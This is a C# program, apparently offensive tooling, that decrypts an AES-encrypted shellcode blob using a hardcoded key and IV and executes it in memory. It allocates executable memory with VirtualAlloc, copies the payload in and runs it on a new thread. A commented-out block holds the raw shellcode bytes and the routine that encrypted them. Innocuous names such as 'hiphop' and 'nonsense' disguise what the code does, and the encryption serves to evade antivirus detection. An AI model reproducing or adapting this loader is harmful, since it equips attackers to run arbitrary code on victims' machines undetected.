using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace goodTimes
{
    class Program
    {

        // MAIN
        static void Main(string[] args)
        {
            /*
            byte[] buf = new byte[274] {
0xdb,0xd7,0xb8,0x80,0x35,0xcc,0xa2,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,
0x3e,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0x75,0x8d,0x7e,0xcb,
0x39,0x1f,0xa4,0xc6,0x18,0xab,0x7d,0x23,0xc1,0x7d,0xb7,0x7a,0xcd,0xfe,0x84,
0x79,0x1c,0x42,0x05,0x81,0xaf,0x23,0xb7,0x81,0x00,0x7b,0xec,0x59,0xb9,0x41,
0x00,0x9e,0x86,0x92,0xe8,0x8b,0x92,0xc3,0xb6,0xaf,0x4f,0x4e,0x8a,0xb4,0xd7,
0x94,0xdd,0xfb,0x21,0x78,0xdb,0x20,0xe7,0xd1,0xcb,0x68,0x29,0x45,0x70,0x40,
0xb6,0xdc,0x6e,0xde,0x4e,0x30,0x9c,0xc8,0x27,0x64,0x44,0x65,0x2c,0x2b,0x8b,
0xab,0x5a,0x12,0x98,0xe8,0xd0,0x76,0xef,0xd3,0x10,0xa8,0x37,0x36,0x37,0x36,
0x6c,0xbc,0x98,0x45,0xf6,0xcb,0x70,0xa4,0xc6,0xd1,0x2a,0x98,0xf1,0xfb,0x78,
0x96,0x7c,0xe3,0x0a,0x24,0x97,0x64,0xdb,0x22,0xd9,0xa7,0x42,0x2f,0xa8,0x49,
0xc4,0x1b,0x81,0xbe,0x37,0x26,0x03,0xf6,0x1c,0x6c,0xd4,0x42,0x1c,0xd7,0x35,
0x5f,0x11,0xb9,0x49,0x82,0xa2,0x73,0xac,0x24,0xce,0xf1,0xf9,0xec,0xfb,0x18,
0xd8,0xb6,0x9e,0xce,0x4a,0xfa,0xeb,0x8b,0xb9,0xeb,0xe2,0xd8,0x43,0x7c,0x9f,
0x14,0xad,0x25,0x23,0xbd,0xed,0x65,0x0d,0x82,0x2a,0x45,0x57,0x4e,0x18,0x36,
0x0a,0x8c,0xfa,0xb2,0xa4,0xb7,0x63,0x93,0x49,0x1d,0x6a,0xb0,0x4d,0xc3,0x8d,
0x9b,0x32,0x05,0x8b,0xf5,0x5d,0xc5,0xb4,0x37,0xdb,0xc0,0x46,0xdb,0xa6,0x77,
0x73,0xc8,0xc1,0x8d,0x40,0x08,0xe2,0xdf,0x8e,0x39,0x6d,0x6e,0xb6,0xb1,0x7f,
0x87,0x88,0xd5,0xbe,0xac,0x97,0x7f,0x1b,0x5e,0xa8,0x04,0xc5,0xec,0x41,0x59,
0x39,0xa3,0x60,0xe9 };


            byte[] data = Encrypt(buf, key, iv);
            // Console.WriteLine(Encoding.Default.GetString(data));
            Console.WriteLine("ENCRYPTED:");
            Console.WriteLine(Convert.ToBase64String(data));
            */

            byte[] key = new byte[] { 0x33, 0xED, 0x8A, 0x15, 0xD9, 0x26, 0xC5, 0x1C, 0x95, 0xF1, 0x4C, 0x11, 0xE4, 0x37, 0xD4, 0x5B, 0xE8, 0xDD, 0x8E, 0xED, 0xDC, 0x01, 0x38, 0xC7 };
            byte[] iv = new byte[] { 0x2B, 0x6F, 0xD1, 0xE3, 0x59, 0x6F, 0xC3, 0x31, 0x62, 0xC9, 0x98, 0x55, 0x7B, 0x00, 0xCB, 0xD1 };

            String hiphop = "kbIjKriCiXF6LhkMx/EAGTGjZHr80dARtzBLigPcEpjKP/9Bc+kiBeyOSeNBW+4skDUTGaTA77Yr7vjbzoQlBcZFaXduQJYuERWO5zU6RwQ2rvFGs2a0zJGo05Li0a1lgq+1KsMPF263MEq8BqcmSmx/czX/0c53vSDSDCPlGRuI/Qu9eN2YF0rH0F8MV7bob6vYt2NdLKYWvmpVqc2H6VSk5bXCtiTKDMg7cCOIIPzW/sPMFExrXh8P8K9Sbi3YHIDTIM/5iIrMe4o607++mdkGbXRS0xehJtePThk/Eue/mii7J+TAWngp7lIkAPrG7LuETOC5redvfU7HX/4RqB8kidarzycTRSAy35loXMihnRmSsClls6SwPUrhG78r";

            Console.WriteLine("DECRYPTED:");
            byte[] de_data = Decrypt(Convert.FromBase64String(hiphop), key, iv);
            Console.WriteLine(BitConverter.ToString(de_data));

            nonsense(de_data);

        }


        // Shell Code Loader
        public static bool nonsense(byte[] shellcode)
        {

            try
            {
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
                return false;
            }
        }

        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );


        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

    }
}
